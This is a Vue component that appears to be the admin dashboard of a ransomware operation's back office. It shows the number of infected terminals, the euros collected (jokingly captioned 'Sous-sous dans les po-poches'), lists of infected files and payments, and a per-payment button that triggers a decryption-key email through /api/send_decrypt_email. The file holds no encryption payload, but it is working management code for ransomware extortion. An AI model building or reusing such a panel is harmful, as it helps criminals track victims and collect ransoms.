<template>

    <div class="layout_horizontal">
        <Header/>

        <FlashMessage
            v-if="error"
            :type="'error'"
            :message="error"
        />

        <div v-else class="home">

            <FlashMessage
                v-if="email.error || email.message"
                :type="email.error ? 'error' : 'success'"
                :message="email.error ? email.error :  email.message"
            />

            <div>
                <div class="card paragraphe">
                    <div class="grid">
                        <div class="card-statistics">
                            <p class="text-center medium">
                                Terminaux&nbsp;infectés&nbsp;
                            </p>
                            <h2 class="text-danger text-center large">{{ infectedTerminals }}</h2>
                            <p class="text-amber text-center small">au {{ $moment(new Date()).format("LLL") }}</p>
                        </div>
                        <div class="card-statistics">
                            <p class="text-center medium">
                                Sous-sous dans les po-poches
                            </p>
                            <h2 class="text-danger text-center large">{{ totalAmount }} €</h2>
                            <p class="text-amber text-center small">au {{ $moment(new Date()).format("LLL") }}</p>
                        </div>
                    </div>
                </div>
                <div class="grid">
                    <InfectedFileStat :infectedFiles="infectedFiles" />
                    <PaymentStat :payments="payments" @clickHandler="sendEmail"/>
                </div>
            </div>

        </div>
    </div>

</template>

<script lang="ts">
import {defineComponent} from 'vue';
import Header from '../components/commons/Header.vue';
import HttpRequest from '../core/services/http/HttpRequest';
import {isAdmin, isLogged, isTokenExpired} from '../core/services/utils/auth';
import FlashMessage from "../components/FlashMessage.vue";
import PaymentStat from "../components/stats/PaymentStat.vue";
import InfectedFileStat from "../components/stats/InfectedFileStat.vue";

export default defineComponent({
    name: 'Home',
    data() {
        return {
            error: null as string | null,
            token: isLogged(),
            infectedFiles: [] as any[],
            payments: [] as any[],
            infectedTerminals: 0,
            totalAmount: 0,
            email: {
                message: null as string | null,
                error: null as string | null
            }
        }
    },
    components: {
        InfectedFileStat,
        PaymentStat,
        FlashMessage,
        Header
    },
    methods: {
        call(token: string | null): void {
            HttpRequest.get('/api/logs', token)
                .then((response: any) => {
                    this.payments = response.data.transactions
                    this.infectedFiles = response.data.logs
                    this.infectedTerminals = response.data.infectedTerminals
                    this.totalAmount = response.data.totalAmount
                    if([400, 404].includes(response.data.status_code)) {
                        this.$router.push('/*')
                    }
                })
                .catch((error: any) => {
                    this.error = error;
                });
        },
        sendEmail(id: number) {
            HttpRequest.get('/api/send_decrypt_email/'+id, this.token)
                .then((res) => {
                    if(res.data.error) {
                        this.email.error = res.data.message;
                    } else {
                        this.email.message = res.data.message
                    }
                }).catch((error) => {
                this.email.error = error;
            });
        }
    },
    created() {
        if (this.token) {
            isTokenExpired(this.token);
            if(!isAdmin(this.token)) {
                this.$router.push('/payment');
            } else {
                this.call(this.token);
            }
        } else {
            this.$router.push('/login')
        }
    }
});
</script>

<style lang="scss" scoped>
 .card-statistics:not(:first-child) {
     margin-left: 2rem;
 }
 .card-statistics:not(:last-child) {
      margin-right: 2rem;
  }
</style>
